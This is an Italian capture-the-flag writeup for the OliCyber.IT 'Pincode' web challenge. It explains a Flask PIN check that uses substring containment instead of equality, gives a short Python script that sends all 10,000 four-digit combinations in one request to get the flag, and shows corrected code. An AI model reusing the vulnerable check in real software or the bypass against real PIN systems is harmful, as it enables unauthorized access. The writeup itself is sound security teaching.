# Writeup & Analisi Tecnica: Pincode

* **Piattaforma:** OliCyber.IT
* **Categoria:** Web Security / Flaw Logico
* **Vulnerabilità:** Flawed Substring Containment (`in` vs `==`)
* **Flag:** `flag{570_7u770_k3kk470}`

---

## 1. Il Codice Sorgente e il Flusso dell'Applicazione

Nel backend Flask, la gestione della richiesta `POST` è implementata nel seguente blocco:

```python
def generate_code():
  return ''.join(random.choices(string.digits, k=4))


@app.route('/', methods=['POST', 'GET'])
def index():
  if request.method == 'GET':
    return render_template('index.html')
  else:
    pincode = request.form.get('pincode')
    code = generate_code()

    if pincode and code in pincode:
      return render_template('index.html', FLAG=FLAG)
    return render_template('index.html', error='Codice non valido')

```

Sul client (il browser), l'interfaccia grafica impone un limite visivo di 4 cifre tramite JavaScript:

```javascript
let code = "";
const add_digit = (digit) => {
    let current_digit = code.length;
    code += digit;
    document.getElementById(`pincode_${current_digit}`).value = digit;
    if (code.length == 4) {
        submit();
    }
};

```

---

## 2. Focus sulla Vulnerabilità: L'Operatore `in`

La vulnerabilità risiede esclusivamente nell'istruzione condizionale:

```python
if pincode and code in pincode:

```

### Differenza Semantica in Python

| Operatore | Significato | Comportamento nel contesto del PIN |
| --- | --- | --- |
| `code == pincode` | **Uguaglianza esatta** | Richiede che la stringa inviata coincida carattere per carattere e nella lunghezza con il codice segreto (probabilità di indovinare: 1 su 10.000). |
| `code in pincode` | **Inclusione di sottostringa** | Verifica se la sequenza di caratteri `code` è **contenuta all'interno** della stringa `pincode`, indipendentemente dalla lunghezza di quest'ultima. |

### Perché il controllo fallisce?

1. **Assenza di validazione sulla lunghezza:** Il server non impone che `len(pincode) == 4`. Il limite di 4 caratteri esiste solo nel frontend JavaScript, che può essere completamente ignorato inviando una richiesta HTTP manuale.
2. **Spazio di ricerca limitato:** Un PIN a 4 cifre ammette solo $10^4 = 10.000$ combinazioni possibili (`"0000"` fino a `"9999"`).
3. **Inclusione garantita:** Inviando un payload che concatena tutte le 10.000 combinazioni possibili in un'unica stringa lunga 40.000 caratteri (o una sequenza De Bruijn di soli 10.003 caratteri), qualsiasi sequenza di 4 cifre generata dal backend a runtime risulterà **matematicamente presente** come sottostringa di `pincode`.

La condizione `code in pincode` restituirà sempre `True` al primo tentativo con probabilità del 100%.

---

## 3. Exploit

Bypasando il client e inviando direttamente la richiesta POST con tutte le combinazioni:

```python
#!/usr/bin/env python3
import re
import requests

TARGET_URL = "http://<target_url>/"

# Genera una stringa che include tutte le combinazioni da "0000" a "9999"
all_combinations = "".join(f"{i:04d}" for i in range(10000))

response = requests.post(TARGET_URL, data={"pincode": all_combinations})

flag = re.search(r"flag\{.*?\}", response.text)
if flag:
  print(f"[+] Flag trovata: {flag.group(0)}")
else:
  print("[-] Errore: Flag non presente nella risposta.")

```

---

## 4. Remediation (Correzione del codice)

Per correggere la vulnerabilità nel backend occorre:

1. Utilizzare l'operatore di uguaglianza esatta `==`.
2. Validare rigorosamente la lunghezza e il formato dell'input prima di processarlo.
3. Utilizzare generatori crittograficamente sicuri (`secrets` anziché `random`).

```python
import secrets
import string


def generate_code():
  return "".join(secrets.choice(string.digits) for _ in range(4))


@app.route("/", methods=["POST", "GET"])
def index():
  if request.method == "GET":
    return render_template("index.html")

  pincode = request.form.get("pincode", "")
  code = generate_code()

  # Validazione rigorosa: lunghezza 4, solo cifre e uguaglianza esatta
  if len(pincode) == 4 and pincode.isdigit() and pincode == code:
    return render_template("index.html", FLAG=FLAG)

  return render_template("index.html", error="Codice non valido")

```
